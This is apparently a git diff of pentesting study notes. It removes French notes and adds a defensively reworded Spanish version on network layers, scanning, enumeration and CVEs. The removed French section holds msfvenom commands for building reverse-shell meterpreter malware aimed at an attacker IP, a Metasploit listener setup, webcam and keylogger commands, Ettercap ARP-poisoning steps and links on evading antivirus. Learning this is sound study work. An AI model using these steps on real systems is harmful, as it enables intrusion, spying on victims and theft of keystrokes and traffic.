+| UDP | No garantiza entrega ni orden, pero tiene menos sobrecarga. | DNS, streaming, videojuegos, VoIP. |
 
---> Une box Internet est constitué d'un modem ADSL et d'un routeur 
+TCP utiliza un proceso de establecimiento de conexión conocido como *three-way handshake*:
 
-#### 3. Couche 4 : communiquer entre applications
+1. El cliente envía `SYN`.
+2. El servidor responde con `SYN-ACK`.
+3. El cliente responde con `ACK`.
 
-Un serveur = offrir un service. Un serveur web va mettre à disposition des internautes des pages web. Un serveur de messagerie mettra à disposition des adresses mail ainsi qu'un service d'envoi et de réception de mails.
+Así ambas partes confirman que pueden comunicarse antes de intercambiar datos.
 
-Étant donné que le serveur est censé fournir un service accessible tout le temps, on dit qu'il est en écoute. En fait, le serveur va écouter sur le réseau et être prêt à répondre aux requêtes qui lui sont adressées.
+Un servicio puede escuchar solo en `127.0.0.1`, la dirección de loopback. En ese caso, únicamente será accesible desde la propia máquina, no desde otros dispositivos de la red.
 
-````
-netstat -antp #tous les listen en train d'ecouter
-#La colonne "Adresse locale" nous donne l'adresse IP en écoute, ainsi qu'un numéro que nous ne connaissons pas encore.
-#La colonne "Etat" nous indique l'état du service
-#La colonne "PID/program name" nous indique le numéro du processus en écoute ainsi que son nom.
-#Si le service a une addr locale 127.0.0.1 : service non joignable depuis le reseau, joignable que depuis la machine elle-même, reserve a une utilisation locale.
-````
-
-Client = Oui, en ce moment même vous utilisez un client web qui est votre navigateur et qui se connecte au serveur du Site du Zéro.
- = Connexion client/serveur entre votre navigateur et le serveur web du Site du Zéro. Client de messagerie comme Outlook.
- 
-|couche| 4 |
-|------|----|
-| role |  objectif de faire dialoguer ensemble des applications, cad gérer les connexions applicatives|
-| identifiant | le port : Le port c'est l'adresse d'une application sur une machine. On a 65535 ports à notre disposition, et pleins de ports reserves (web=80, mail=25, ssh=22, imap=143, proxy=8080, https=443...)|
-| protocoles | 2 protocoles : TCP (applications qui nécessitent un transport fiable des données, mais qui n'ont pas de besoin particulier en ce qui concerne la vitesse de transmission par exemple les mails ou le web) et UDP (applications qui nécessitent un transport immédiat des informations, mais qui peuvent se permettre de perdre quelques informations. Par exemple le streaming ou la radio) |
-| nom des messages | datagramme UDP (qui contient: Port Source=addrapplicationqui envoielinfo - Port Destination=addrapplicationquirecoitinfoparexmonnavigateur - Longueur totale - Checksum - Données à envoyer) et le segment TCP (Port Source - Port Destination - Flags - Checksum - Données à envoyer)|
-
-#### 4. Couche 7 : Applications 
-Elle est là pour représenter les applications pour lesquelles nous allons mettre en œuvre des communications. Les couches 1 à 4 sont appelées les couches "réseau". Ce sont elles qui ont la responsabilité d'acheminer les informations d'une machine à une autre, pour les applications qui le demandent.
-
-#### 5. protocoles DHCP, DNS, et HTTP
-- Protocole DHCP = Un protocole pour distribuer des adresses IP. La première fonction d'un serveur DHCP est de fournir des adresses IP aux machines en faisant la demande.
-- Protocole DNS = Systeme de nomage pour eviter d'avoir a retenir toutes les adresses ip, se charge de convertir (on parle de résolution) le nom du site web demandé en adresse IP.
-- Protocole HTTP = Le principe du protocole HTTP est de transporter ces pages HTML, et potentiellement quelques informations supplémentaires. Le serveur web met donc à disposition les pages web qu'il héberge, et le protocole HTTP les transporte sur le réseau pour les amener au client.
-
-
-
-# III - Offensive Pentesting
-- [Certification CEH v11](https://bookshelf.vitalsource.com/#/books/9781635675337/cfi/112!/4/4@0.00:36.5)
-- [Tryhackme](https://tryhackme.com/paths)
-
-### Attaques
-
-| Attack| Description | Example|
-|------|----|-------|
-| Passive Attacks | interception et surveillance du trafic réseau et des flux de données sur le réseau cible sans modifier les données. Capturer les données ou les fichiers transmis sur le réseau sans le consentement de l'utilisateur (données non chiffrées en transit, informations d'identification en texte clair...) | **sniffing** (wireshark) and eavesdropping, footprinting|
-| Active Attacks | altèrent les données en transit ou perturbent la communication ou les services entre les systèmes pour contourner ou pénétrer dans les systèmes sécurisés. Les attaquants lancent des attaques sur le système ou le réseau cible en envoyant activement du trafic pouvant être détecté. | **Ddos** (prendre pour cible un système informatique en l’inondant de messages entrants ou de requêtes de connexion afin de provoquer un déni de service), **Man-in-the-Middle**, **session hijacking** (technique consistant à intercepter une session TCP initiée entre deux machine afin de la détourner), **SQL injection** (injecter dans la requête SQL en cours un morceau de requête non prévu par le système et pouvant en compromettre la sécurité.), **malware attacks** (virus, ransomware..), **spoofing** (usurpation d'identite, se faire passer pour le routeur par ex), **password-based attacks** (cracker mdp), **Cryptography attacks**|
-| Close-in Attacks | Lorsque l'attaquant se trouve à proximité physique du système ou du réseau cible. Objectif de collecter ou de modifier des informations ou d'en perturber l'accès. | Eavesdropping, **shoulder surfing** (regarder par-dessus l'épaule), **dumpster diving** (chercher dans la poubelle de quelqu'un des informations)|
-| Insider Attacks | effectuées par des personnes de confiance qui ont un accès physique aux actifs critiques de la cible. Utiliser un accès privilégié pour enfreindre les règles ou provoquer intentionnellement une menace pour les informations ou les systèmes d'information de l'organisation.| **theft of physical devices** (vol d'appareils physiques) and **planting keyloggers** (enregistreurs de claviers), backdoors, malware, social engineering |
-| Distribution Attacks | Lorsque les attaquants altèrent le matériel ou le logiciel avant l'installation. Par exemple les portes dérobées créées par les fournisseurs de logiciels ou de matériel au moment de la fabrication | modification of software or hardware during production |
-
-### Etapes
-
-| Etape |description|
-|------|----|
-|**1** | **Reconnaissance** : recolter le plus d'infos genre organization’s clients, employees, operations, network, and systems|
-|**2** | **Scanning** : utiliser les détails recueillis lors de la reconnaissance pour scanner le réseau à la recherche d'informations spécifiques genre mapping of systems, routers, and firewalls by using simple tools such as the standard Windows utility Traceroute. L'analyse peut inclure the use of dialers, port scanners, network mappers, ping tools, vulnerability scanners, or other tools. Les attaquants extraient des informations telles que les machines actives, le port, l'état du port, les détails du système d'exploitation, le type de périphérique et la disponibilité du système pour lancer une attaque. scanners de vulnérabilités, qui peuvent rechercher des milliers de vulnérabilités connues sur un réseau cible. Si vulnerabilite direct ca donne un avantage à l'attaquant car il n'a qu'à trouver un seul moyen d'entrée|
-|**3** | **Gaining Access** : Les attaquants utilisent les vulnérabilités identifiées lors des phases de reconnaissance et d'analyse pour accéder au système et au réseau cibles. The attacker can gain access to the OS, application, or network level (gain access to the target system locally (offline), over a LAN, or the Internet) avec differents types d'attaques. Une fois qu'un attaquant a accès au système cible, il essaie alors d'élever les privilèges afin de prendre le contrôle total. Ce faisant, ils compromettent également les systèmes intermédiaires qui y sont connectés.|
-|**4**| **Maintaining Access** : Une fois qu'un attaquant a accès au système cible avec des privilèges d'administrateur il peut utiliser à la fois le système et ses ressources à volonté. Les attaquants qui choisissent de ne pas être détectés suppriment les preuves de leur entrée et installent une porte dérobée ou un cheval de Troie pour obtenir un accès répété. Ils peuvent également installer des rootkits au niveau du noyau pour obtenir un accès administratif complet à l'ordinateur cible. Les rootkits accèdent au niveau du système d'exploitation, tandis que les chevaux de Troie accèdent au niveau de l'application. Les rootkits et les chevaux de Troie nécessitent que les utilisateurs les installent localement.|
-|**5**| **Clearing Tracks** : utilisent des utilitaires tels que PsTools, Netcat ou des chevaux de Troie pour effacer leurs empreintes des fichiers journaux du système. D'autres techniques incluent la stéganographie et la tunnellisation. Les administrateurs système peuvent déployer des IDS (systèmes de détection d'intrusion) et un logiciel antivirus basés sur l'hôte afin de détecter les chevaux de Troie et autres fichiers et répertoires apparemment compromis |
-
-### 1. Footprinting and Reconnaissance
-### 2. Scanning Networks
-
-####  Ma machine
-
-| ifconfig | Ping | Route |
-|----------|-------|--------|
-| - La première est l'interface eth0 (eth pour Ethernet !) qui est ma carte réseau. - Enfin nous avons l'interface lo (pour local, ou loopback) qui est une interface réseau virtuelle qui n'est accessible que sur la machine elle-même. Son adresse est toujours 127.0.0.1, sur toutes les machines. C'est une convention. - Si ifconfig indique inet adr:88.191.45.68  Bcast:88.191.45.255  Masque:255.255.255.0 : adresse IP 88.191.45.68, masque 255.255.255.0 et l'adresse de broadcast 88.191.45.255.  | Machine emetrice du ping fait un ICMP echo request, machine receptrice fait un ICMP echo reply (ping utilise le protocole ICMP). Permet de savoir si la machine pingée est correctement joignable sur le reseau. + mesure le temps necessaire au paquet pour faire l'aller retour entre la machine emetrice et la machine receptrice. | pour avoir mon gateway (= routeur)|
-
-
-````
-ifconfig
-ifconfig eth0 10.0.0.1 netmask 255.255.255.0 #modifier son adresse et la remplacer par 10.0.0.1/24 
-ping 8.8.8.8 #je ping le serveur DNS de google
-route
-arp -a #permet de voir addr ip avec addr MAC si on fait un changement avec mitm attack
-curl ifconfig.me #addresse IP publique sous mac
-ipconfig getifaddr en0 #adress IP privee sur mon mac
-hostname -I #sous linux pour laddr IP privee
-lsof -Pn -i4 #voir mes ports ouvert sur mac
-````
-
-si je suis sur VM attention reglages reseau [explication](https://chrtophe.developpez.com/tutoriels/gestion-reseau-machine-virtuelle/)
-- soit jutilise le LAN (et j'ai addresse IP de type 10.0.2.2)
-- soit j'utilise un pont avec ma machine hote. Dans ce mode, la carte réseau virtuelle est « pontée » à une carte réseau physique de l’hôte. Cette carte réseau aura donc 2 adresses IP, une dédiée à l'hôte et l'autre dédiée à la machine virtuelle. 
-
-
-[calculateur ip et infos](http://www.hobbesworld.com/reseaux/calcip.php#gene) 
-
-[CIDR masque de sous-reseau](https://fr.wikipedia.org/wiki/Sous-r%C3%A9seau)
-
-
-####  Scanning
-
-| Port Scanning | Network Scanning | Vulnerability Scanning |
-|----------|-------|--------|
-| Répertorie les ports et services ouverts. L'analyse des ports consiste à se connecter ou à sonder les ports TCP et UDP du système cible pour déterminer si les services sont en cours d'exécution ou sont en état d'écoute. L'état d'écoute fournit des informations sur l'OS (=fingerprinting) et l'application en cours d'utilisation. Parfois, les services actifs à l'écoute peuvent permettre à des utilisateurs non autorisés de mal configurer les systèmes ou d'exécuter des logiciels présentant des vulnérabilités. | Répertorie les hôtes actifs et les adresses IP.| Affiche la présence de faiblesses connues. Un scanner de vulnérabilité se compose d'un moteur d'analyse et d'un catalogue. Le catalogue comprend une liste de fichiers communs avec des vulnérabilités connues et des exploits communs pour une gamme de serveurs. les ports sont les portes et les fenêtres d'un système qu'un intrus utilise pour y accéder.|
-
-[doc de reference nmap](https://nmap.org/man/fr/index.html)
-`````
-####sur l'outil nmap : 
-outil open source d'exploration réseau, a été conçu pour rapidement scanner de grands réseaux, fonctionne aussi très bien sur une cible unique. 
-Détermine quels sont les hôtes actifs sur le réseau, quels services (y compris le nom de l'application et la version) ces hôtes offrent, 
-quels systèmes d'exploitation (et leurs versions) ils utilisent, quels types de dispositifs de filtrage/pare-feux sont utilisés, 
-ainsi que des douzaines d'autres caractéristiques.
-####
-nmap [ <Types de scans> ...] [ <Options> ] { <spécifications des cibles> }
---traceroute: Détermine une route vers chaque hôte
-nmap -sP *addrreseau**masquesousreseauCIDR* #hosts up (sP: Ping Scan - Ne fait que déterminer si les hôtes sont en ligne)
-sudo nmap -sn *addrreseau**masquesousreseauCIDR* #hosts up + Addr mac + nous dit si (apple) ... ## QUI EST SUR MON RESEAU ?
-####
-#Si j'ouvre un port 80:80 sur mon mac 
-brew install nginx
-brew services start nginx
-brew services list
-#et que je regarde sur mon kali
-nmap -A *addripcible* #ports ouverts (-A = Active la détection du système d'exploitation et des versions) #me donne le port 80:80 ouvert
-####
-#Si je teste les vulnerabilites
-nmap -sV --script vuln *addripcible*
-`````
-
-```
-hping3 <options> <target IP address> #can be used for network security auditing, firewall testing, manual path MTU discovery, advanced traceroute, remote OS fingerprinting, remote uptime guessing, TCP/IP stacks auditing, etc.
-#default is TCP
-hping3 -1 #ICMP
-hping3 -A #ACK
-hping -2 #UDP 
+```bash
+ss -lntp
 ```
 
-####  Enumeration
-Processus d'extraction des noms d'utilisateur, des noms de machine, des ressources réseau, des partages et des services d'un système ou d'un réseau. Selon les ports ouverts, on va enumerer :
+Este comando permite ver servicios TCP en escucha y, si se ejecuta con permisos suficientes, el proceso asociado.
 
-Techniques to extract informations :
-- **Extract usernames using email IDs**
-- **Extract information using default passwords** : nombreuses ressources en ligne fournissent une liste de mots de passe par défaut attribués par les fabricants à leurs produits
-- NetBIOS Enumeration (port 139 + sur windows)
-- **SNMP Enumeration (UDP 161)**
-- **NTP and NFS Enumeration**
-- **SMTP and DNS Enumeration** : Un administrateur réseau peut utiliser le transfert de zone DNS, avec commandes nslookup et dig, pour répliquer les données DNS sur plusieurs serveurs DNS ou sauvegarder des fichiers DNS. Dans cette operation il convertira tous les noms DNS et adresses IP hébergés par ce serveur en texte ASCII. Si le serveur DNS est mal config, le transfert de zone DNS peut être une méthode efficace pour obtenir des informations sur le réseau de l'organisation :listes de tous les hôtes nommés, sous-zones et adresses IP associées.
-- **LDAP Enumeration** : Microsoft Active Directory aurait une erreur de conception. toutes les tentatives d'authentification du service entraînent des messages d'erreur différents. Les attaquants en profitent pour énumérer des noms d'utilisateur valides, et s'ils trouvnet un nom d'utilisateur valide ils brute fore le mdp.
+***
 
-```
-############Exemple d'enumuration############
-#####Si le systeme cible est sur Windows#####
-###et qu'il a le port 139 ouvert = Netbios###
+### Capa 7: aplicación
 
-nbtstat [-a RemoteName] [-A IP Address] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [Interval]
-nbtstat -a <ip addres of the remote machine>
-nmap -sV -v --script nbstat.nse <target IP address>
-##Enumeration of user accounts with Pstools##
-PsExec - executes processes remotely 
-PsFile - shows files opened remotely 
-PsGetSid-displays the SID of a computer or user 
-PsKill - kills processes by name or process ID 
-PsInfo - lists information about a system 
-PsList - lists detailed information about processes
-PsLoggedOn - shows who is logged on locally and via resource sharing
-PsLogList - dumps event log records 
-PsPasswd - changes account passwords
-PsShutdown - shuts down and optionally reboots a computer
-```
+La capa de aplicación representa los protocolos y servicios utilizados directamente por programas de usuario.
 
-```
-############Exemple d'enumuration############
-#######Si le systeme cible utilise SNMP######
-###############port 161 ouvert###############
+Ejemplos:
 
-Snmpcheck
-SoftPerfect Network Scanner
-```
+- HTTP y HTTPS para la Web.
+- DNS para resolver dominios a IP.
+- SMTP, IMAP y POP3 para correo electrónico.
+- SSH para administración remota.
+- FTP o SFTP para transferencia de archivos.
 
-####  Vulnerability Analysis
+***
 
-acronyme CVE = désigne une liste publique de failles de sécurité informatique. Lorsque l'on parle d'une CVE, on fait généralement référence à l'identifiant d'une faille de sécurité répertoriée dans cette liste. Les identifiants CVE sont attribués par des autorités déléguées, les CNA (CVE Numbering Authority). Les CNA disposent de blocs d'identifiants CVE alloués par le MITRE, qui sont réservés et attribués aux failles au moment de leur découverte. 
+### DHCP, DNS y HTTP
 
-```
-nmap -sV --script vuln *addripcible* #imaginons que j'ai un nginx de lance sur mon ordi cible
-CSRF vulnerabilites
-DOM based XXS
-stored XXS vulnerabilites
-VULNERABLE : apache web server cve:cve-2011-3192
-apache web server vulnerable to a Ddos attack
-#brew remove nginx
-# pour fermer un port sur mac :
-# lsof -Pn -i4 #pour lister port ouvert, je peux recupeer pid
-# sudo kill -9 PID
-```
+#### DHCP
 
-```
-OpenVAS #scanner de vulnerabilites
-Nessus #logiciel scanner de vulnerabilites
-Nikto #scanner vulnerabilites d'un serveur web
-```
+DHCP asigna de forma automática parámetros de red a los dispositivos, entre ellos:
 
-Metasploit :
-C'est un framework = ensemble de nombreux logiciels. Permet de collecter des informations, créer des logiciels malveillants, pirater des FTP, pirater Android et bien d’autres choses. Nmap est également intégré dans Metasploit ; vous pouvez utiliser Nmap dans Metasploit sans avoir besoin d’ouvrir un nouveau Terminal
-- Exploit : Dans Metasploit exploit signifie exploiter. Si vous avez installé le shell inversé correctement sur la machine cible, vous pouvez explorer le système avec l’aide d’exploit. Par défaut, 1590 exploits sont disponibles dans Metasploit. Possibilite de creer son propre exploit dans Metasploit.
-- Payload : bout de code qui permet de pirater le système et exploit aide à faire tout ce que vous voulez faire avec la machine piratée. Cela vous aide à créer un virus.
-```
-##LHOST : lhost est l’adresse IP de l’attaquant
-##LPORT : C’est le port que vous souhaitez utiliser
-##RHOST : Ceci est l’adresse IP de la machine victime
-##RPORT : Le numéro de port de la victime.
-#### start :
-service postgresql start #aide a faire tourner metasploit
-msfconsole #lance metaqsploit
-Show exploits #Pour afficher les différents types d’exploits
-```
+- dirección IP;
+- máscara o prefijo de red;
+- puerta de enlace predeterminada;
+- servidores DNS;
+- tiempo de concesión de la dirección.
 
+Sin DHCP, habría que configurar estos valores manualmente en cada equipo.
 
-### 3. System Hacking
-#### Sniffing
+#### DNS
 
-Wireshark est un sniffer. Un sniffer est un programme qui écoute sur le réseau, intercepte toutes les trames reçues par votre carte réseau, et les affiche à l'écran.
-- on peut voir la liste des trames reçues lors d'une requête (couche 1 "Frame 187", la couche 2 "Ethernet", la couche 3 "IP" etc.),
-- en cliquant sur l'une des trames on voit que Wireshark sépare les éléments de chacune des couches du modèle OSI
-- on peut voir le contenu de chacune des couches en cliquant sur le triangle en face d'une couche
+DNS traduce nombres de dominio, como `www.ejemplo.com`, a direcciones IP. Es lo que permite navegar usando nombres legibles en vez de memorizar direcciones numéricas.
 
-[infos sur wireshark](https://openclassrooms.com/fr/courses/857447-apprenez-le-fonctionnement-des-reseaux-tcp-ip/855562-rendre-mes-applications-joignables-sur-le-reseau)
+#### HTTP y HTTPS
 
-````
-apt-get install wireshark
-sudo wireshark #ECOUTER MON PROPRE RESEAU, sauf si MITM ATTACK
-#interface reseau utilisee par cible et routeur et machine qui attaque (eth0)
-filter : ip.addr == *addrcible*
-filter : ip.addr == *addrcible* && http #pour voir les requetes http. tester sur mon propre reseau, marche correctement sur sites http sans SSL
-````
+HTTP es el protocolo que permite a un navegador solicitar recursos a un servidor web: páginas HTML, imágenes, scripts, archivos CSS o datos de APIs.
 
-Tcpdump est un sniffer, comme wireshark, mais en ligne de commande sous linux.
-````
-tcpdump -i eth0 -n port 80 and host *addripquonveutecouter* #on ecoute le port 80 de la machine cible
-````
+HTTPS es HTTP protegido por TLS. Añade cifrado, integridad y autenticación del servidor, por lo que evita que terceros puedan leer o modificar fácilmente la comunicación en tránsito.
 
-#### Hacking Wireless Networks
+***
 
-- ARP poisoning using Ettercap, MiTM attack
-ARP poisoning is an attack that is accomplished using the technique of ARP spoofing. 
-ARP protocol :  protocole utilisé pour traduire une adresse de protocole de couche réseau (adresse IPv4) en une adresse de protocole de couche de liaison (adresse MAC). 
+## III. Ciberseguridad ofensiva y pentesting
 
-[Ettercap doc reference](https://www.irongeek.com/i.php?page=backtrack-3-man/ettercap)
-````
-sudo ettercap -T -S -i eth0 -M arp:remote /*addrmachinecible*// /*addrrouteur*//
-*addrmachinecible* = target1
-*addrrouteur* = target2
-##sur linterface graphique : 
-off le sniffing at startup, valider
-loupe pour voir qui est sur mon reseau, puis emoticone a droite de la loupe pr guetter mes targets
-selectionner les targets
-lancer mitm attack
-=> checker si changement de MAC pour le routeur a marche sur la machine cible : arp -a
-=> pinger le routeur, normalement prend plus de temps qu'un ping classique
-````
-The principles  and techniques of a MiTM attack remain the same as with arpspoof  with the small exception of the ip_forward. Unlike arpspoof, ettercap does not use ip forwarding in the Linux kernel, but instead uses it own module to forward IP packets
+El pentesting consiste en evaluar de forma autorizada la seguridad de sistemas, aplicaciones o redes. Su finalidad legítima es encontrar debilidades antes que un atacante y documentar cómo corregirlas.
 
-http://www.kali-linux.fr/forum/index.php?topic=3948.0
+No se debe escanear, interceptar tráfico ni probar vulnerabilidades sobre redes, servicios o dispositivos ajenos sin autorización expresa.
 
-http://www.kali-linux.fr/forum/index.php/topic,3822.0.html
+### Tipos de ataques
 
-- on peut faire la meme avec arpspoof et dnsspoof
-Si y a des problemes lors du ping et que le forwarding des paquets n'est pas active :
-```
-echo 1 > /proc/sys/net/ipv4/ip_forward #activer le forwarding des paquets
+| Tipo | Descripción | Ejemplos |
+|---|---|---|
+| Ataques pasivos | Observan o recopilan información sin alterar directamente los sistemas. | Análisis de metadatos, reconocimiento, captura autorizada de tráfico. |
+| Ataques activos | Modifican, interrumpen o intentan acceder a sistemas. | Denegación de servicio, suplantación, inyección SQL, secuestro de sesión. |
+| Ataques de proximidad | Requieren cercanía física a la víctima o al entorno. | Shoulder surfing, robo de dispositivos, ingeniería social presencial. |
+| Ataques internos | Los realiza alguien con acceso autorizado que abusa de sus privilegios. | Exfiltración de datos, instalación de software no autorizado, sabotaje. |
+| Ataques a la cadena de suministro | Alteran software, hardware o actualizaciones antes de que lleguen al usuario final. | Dependencias comprometidas, actualizaciones maliciosas, firmware manipulado. |
+
+***
+
+### Fases de una evaluación de seguridad
+
+Un proceso de pentesting responsable suele incluir las siguientes etapas:
+
+1. **Reconocimiento**  
+   Recopilación de información pública y autorizada sobre el objetivo: dominios, rangos IP, tecnologías, servicios, empleados o infraestructura expuesta.
+
+2. **Descubrimiento y escaneo**  
+   Identificación de hosts activos, puertos expuestos, servicios, versiones y configuraciones visibles.
+
+3. **Enumeración**  
+   Obtención más detallada de información de los servicios accesibles: recursos compartidos, configuraciones, usuarios expuestos o datos de versiones.
+
+4. **Análisis de vulnerabilidades**  
+   Comparación de software y configuraciones con vulnerabilidades conocidas, como CVE.
+
+5. **Validación controlada**  
+   En un entorno autorizado, se comprueba si una debilidad es explotable y cuál sería su impacto real.
+
+6. **Informe y remediación**  
+   Se documentan las evidencias, el impacto, la prioridad de cada hallazgo y las medidas correctoras.
+
+7. **Revisión posterior**  
+   Se verifica que los fallos se han corregido y que la solución no ha creado problemas adicionales.
+
+En un pentest profesional, “borrar huellas” no es una fase legítima: las acciones deben quedar registradas para facilitar auditoría, análisis y corrección.
+
+***
+
+### Reconocimiento y análisis de red
+
+Comandos útiles en un laboratorio propio:
+
+```bash
+ip addr
+ip route
+arp -a
+ping 8.8.8.8
 ```
 
+- `ip addr`: muestra las interfaces y direcciones configuradas.
+- `ip route`: muestra la puerta de enlace y las rutas.
+- `arp -a`: muestra asociaciones conocidas entre IP y direcciones MAC.
+- `ping`: utiliza ICMP para comprobar conectividad y estimar latencia.
 
-#### Malware Threats
+Ejemplos para conocer tu propia IP:
 
-
-- msfvenom = composant majeur de Metasploit qui vous permet de générer des payloads, exécutables, shellcodes, apk pour les utiliser dans vos exploitations. Cependant, ces shellcodes créés ne sont pas si effaces que ça en a l’air. Ils contiennent de mauvais caractères ce qui fait qu’un antivirus stupide peut les attraper facilement, c’est pourquoi vous aurez besoin d’une autre fonctionnalité de msfvenom qui est l’encodage, ce dernier permet d’éviter ces mauvais caractères.  le meilleur classement est celui de l’encodeur x86/shikata_ga_nai
-
-
-- exploit = une faille dans un système, application ou un service qui va permettre à un attaquant de l’exploiter afin de compromettre sa sécurité.
-- payload = code que le système va exécuter pour avoir un résultat précis. Exemple : un reverse shell est un payload qui se charge de créer une connexion de la machine victime vers la machine de l’attaquant tandis qu’un bind shell est un payload qui lie (bind) l’invite de commande avec un port en écoute.
-- shellcode = semblable aux payloads sauf qu’il est écrit en assembly. Exemple : après avoir exploité une machine, un meterpreter shell est fourni pour interagir avec la machine compromise.
-- listener = lorsque vous exploitez un système, ce dernier va tenter d’établir une connexion avec votre machine. Pour cela le listener va écouter jusqu’à l’établissement de la connexion.
-
-Difference entre reverse_tcp et bind_tcp :
-- [reverse_tcp]
-attacker-> [contact me at the port 4444]-> victim - 
-after the payload is executed - 
-attacker <-> [port 4444] <-> victim
-
-- [bind_tcp]
-attacker-> [open the way for me in the port 4444]-> victim - 
-after execution - 
-attacker <-> [port 4444] <-> victim - 
-
-
-- Staged Payload : Le staged payload classique de Metasploit est : windows/meterpreter/reverse_tcp. Ce type de payload est généralement envoyé sur la machine de la victime en deux parties. La première partie est un payload primaire (stage 0) qui crée une connexion entre la machine de la victime à celle de l’attaquant. Un deuxième payload (stage 1) contenant l’exploit est ensuite envoyé à travers la connexion créée, puis exécuté sur la machine de la victime.
-- Stageless Payload : L’équivalent du staged payload classique présenté plus haut (windows/meterpreter/reverse_tcp) dans la catégorie des stageless est: windows/meterpreter_reverse_tcp. Dans cette catégorie, le payload est envoyé entièrement sur la machine de la victime. Celui-ci contient tout ce qui est nécessaire pour obtenir un reverse shell vers la machine de l’attaquant. Aucun transfert supplémentaire à partir de la machine de l’attaquant n’est nécessaire.
-
-
-
-
-Creer malware avec metasploit (etre en root):
-```
-msfvenom –p windows/meterpreter_reverse_tcp –f exe –a x86 –platform windows  LHOST 192.168.174.192 LPORT 4444 –o santy.exe
-msfvenom --payload python/meterpreter/reverse_tcp LHOST=... LPORT=4444 > rev_tcp_4444.py
-## attention ordre arguments important
-#-p prépare le payload.
-#-f exe indique que le type de fichier, ou l’extension de fichier sera exe (windows)
-#-a x86 indique l’architecture système. x86 est utilisée dans les systèmes 32 bits, même si mon système est en 64 bits, on peut faire tourner un programme 32 bits sur un système 64 bits.
-#–platform windows indique que ce virus est pour Windows.
-#-o est le chemin d’enregistrement du fichier, avec son nom. Comme je veux l’enregistrer dans le dossier root, je ne précise que son nom.
-##Le fichier sera sauvegardé dans le répertoire de travail actuel
-```
-```
-#Before executing this file in the target computer, we need to start the multi-handler to listen for incoming connections
-use mulit/handler #use permet de sélectionner un module à utiliser (back permet de sortir de ce module)
-#A module is a piece of software that the Metasploit Framework uses to perform a task, such as exploiting or scanning a target. A module can be an exploit module, auxiliary module, or post-exploitation module.
-#multi/handler : Ce module est un stub qui fournit toutes les fonctionnalités du système de charge utile Metasploit aux exploits qui ont été lancés en dehors du framework
+```bash
+hostname -I
 ```
 
-```
-set PAYLOAD windows/meterpreter/reverse_tcp #meme payload que vous avez utilisé pour créer le malware
-set LHOST 192.168.174.129
-set LPORT 4444
-exploit #ou run c la meme chose
-#Quand la victime lance ce programme, vous allez voir que Metasploit et Meterpreter s’ouvriront
-```
-```
-webcam_snap
-start keyscan_start
-keyscan_stop
+```bash
+ipconfig getifaddr en0
 ```
 
-```
-top #voir tous les running processus en direct
-pgrep -lf python #voir les scripts python qui tournent
-kill -9 <pid> #kill le processus
+El primer comando se usa habitualmente en Linux. El segundo es específico de macOS y obtiene la IP de la interfaz `en0`, que puede corresponder a Wi‑Fi en muchos equipos Apple.
+
+Para comprobar puertos en escucha en macOS:
+
+```bash
+lsof -Pn -i4
 ```
 
-[msfvenom tutorial with different payloads exemples](https://www.hackingarticles.in/msfvenom-tutorials-beginners/)
+***
 
-Payloads encoded with Base64, easily detected by antivirus, https://null-byte.wonderhowto.com/how-to/hacking-macos-create-undetectable-payload-0189715/
-Payloads connus parce que classiques sur metasploit. --> Encrypting Better Than Encoding. Par exemple avec Armor voir tuto en dessous
-[Video tuto Create Undetectable Payloads for macOS Computers with Tokyoneon's Armor](https://www.youtube.com/watch?v=qgroUbiuNTU&t=1s)
+### Escaneo de puertos, red y vulnerabilidades
 
+| Tipo de análisis | Objetivo |
+|---|---|
+| Escaneo de red | Descubrir hosts activos dentro de un rango autorizado. |
+| Escaneo de puertos | Identificar puertos abiertos, cerrados o filtrados. |
+| Detección de servicios | Identificar qué servicio y versión responde en cada puerto. |
+| Análisis de vulnerabilidades | Detectar posibles fallos conocidos o configuraciones inseguras. |
 
-#### Denial-of-Service, Session Hijacking, SQL injection ..
+Nmap es una herramienta de administración y auditoría de red. Puede descubrir hosts, puertos y servicios en redes donde tengas permiso.
 
-# IV - Hack the Box
-### Installation
-Se connecter au VPN [tuto](https://www.youtube.com/watch?v=msCWpKegNlc)
+Ejemplos seguros para un laboratorio propio:
 
-```
-sudo apt-get install network-manager-openvpn
-sudo openvpn --config /path/to/file.ovpn
-# initialization sequence completed = OK
+```bash
+nmap -sn 192.168.1.0/24
 ```
 
-### Methodo
+Realiza descubrimiento de hosts sin hacer un escaneo de puertos convencional.
 
+```bash
+nmap -sV 192.168.1.50
 ```
-######sur mon reseau######
-nmap -sP *ip reseau*/*masque sous reseau* #connaitre le nombre de terminaux connectés aux wifi et leurs adresses IP ("... hosts up")
+
+Intenta identificar servicios y versiones en una máquina autorizada.
+
+```bash
+nmap -A 192.168.1.50
 ```
+
+Activa varias funciones de detección, como versiones, scripts predeterminados, detección de sistema operativo y trazado de ruta. Es más intrusivo, por lo que debe usarse solo con autorización.
+
+Nmap admite scripts NSE mediante `--script`; estos pueden ser categorías, directorios o ficheros Lua concretos. Algunos scripts pueden ser intrusivos, de modo que debes revisar qué hacen antes de ejecutarlos. [nmap](https://nmap.org/book/nse-usage.html)
+
+Los resultados de un escaneo no equivalen automáticamente a una vulnerabilidad real. Una versión detectada puede dar falsos positivos, estar parcheada por el proveedor o no ser explotable debido a la configuración o segmentación de red.
+
+***
+
+### Enumeración de servicios
+
+La enumeración busca información útil después de identificar un servicio accesible. Puede incluir:
+
+- nombres de equipos;
+- recursos compartidos;
+- versiones de software;
+- configuraciones expuestas;
+- registros DNS;
+- información de directorio, siempre dentro de un alcance autorizado.
+
+Servicios que conviene comprender desde el punto de vista defensivo:
+
+| Servicio | Puerto común | Riesgo si está mal configurado |
+|---|---:|---|
+| SMB/NetBIOS | 139, 445 | Recursos compartidos expuestos, permisos débiles o software obsoleto. |
+| SNMP | UDP 161 | Divulgación de información de red mediante comunidades débiles o configuraciones inseguras. |
+| DNS | 53 | Transferencias de zona no restringidas o exposición excesiva de infraestructura. |
+| SMTP | 25, 465, 587 | Configuración incorrecta de relay o exposición de información. |
+| LDAP | 389, 636 | Enumeración de directorio, credenciales mal protegidas o permisos excesivos. |
+| NFS | 2049 | Recursos remotos expuestos con permisos inadecuados. |
+
+Una buena defensa consiste en desactivar servicios innecesarios, aplicar el principio de mínimo privilegio, actualizar software, limitar el acceso por red y monitorizar registros.
+
+***
+
+### CVE y gestión de vulnerabilidades
+
+Una CVE es un identificador público para una vulnerabilidad conocida. Su formato suele ser:
+
+```text
+CVE-año-número
 ```
-######en savoir plus sur la cible######
-ping *addr ip cible* #Permet de savoir si la machine pingée est correctement joignable sur le reseau
